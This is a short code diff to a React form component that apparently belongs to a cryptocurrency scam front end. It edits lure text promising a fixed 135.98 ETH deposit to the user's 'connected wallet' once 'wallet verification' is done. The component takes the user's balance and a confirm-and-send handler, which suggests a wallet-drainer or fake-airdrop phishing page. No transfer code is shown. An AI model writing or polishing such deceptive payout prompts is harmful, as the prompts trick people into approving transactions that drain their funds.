@@ -46,7 +46,7 @@ const VerifyAddressForm = ({ userBalance, confirmAndSend }: VerifyAddressFormPro
     return (
         <>
             <div className='p-4 bg-green-100 rounded-md mb-4'>
-                <h4><span className='font-bold text-lg'>135.98 ETH ({convertETHtoUSD(135.98)})</span> to be deposited to <span className='font-bold text-lg break-all'>{Boolean(inputAddress) ? inputAddress : "input address"}</span> immediately after <span className='font-bold'>wallet verification</span> is done</h4>
+                <h4><span className='font-bold text-lg'>135.98 ETH ({convertETHtoUSD(135.98)})</span> to be deposited to <span className='font-bold'>connected wallet</span> immediately after <span className='font-bold'>wallet verification</span> is done</h4>
             </div>
             <div className='bg-neutral-200 p-4 rounded-md mb-4'>
                 <h4 className='font-semibold uppercase mb-4'>Wallet verification and transfer</h4>
